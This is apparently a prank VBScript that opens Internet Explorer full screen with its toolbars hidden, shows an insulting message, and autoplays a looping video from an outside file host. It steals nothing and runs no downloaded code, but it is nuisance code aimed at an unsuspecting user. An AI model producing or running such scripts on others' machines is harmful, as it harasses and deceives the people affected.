Set objExplorer = CreateObject("InternetExplorer.Application")
With objExplorer
	.Navigate "about:blank"
	.Visible = 1
	.Document.Title = "lol you're fucking stupid lol"
	.Toolbar = False
	.Statusbar = False
	.FullScreen = True
	.Document.Body.InnerHTML = "<html><head><style> video#video { height:100%; width:100%; object-fit:cover; } </style></head><body><center><h1>lol you're fucking stupid lol</h1><video autoplay loop id='video' class='video'><source src='https://files.catbox.moe/i4bv04.mp4' type='video/mp4'></video></center></body></html>"
End With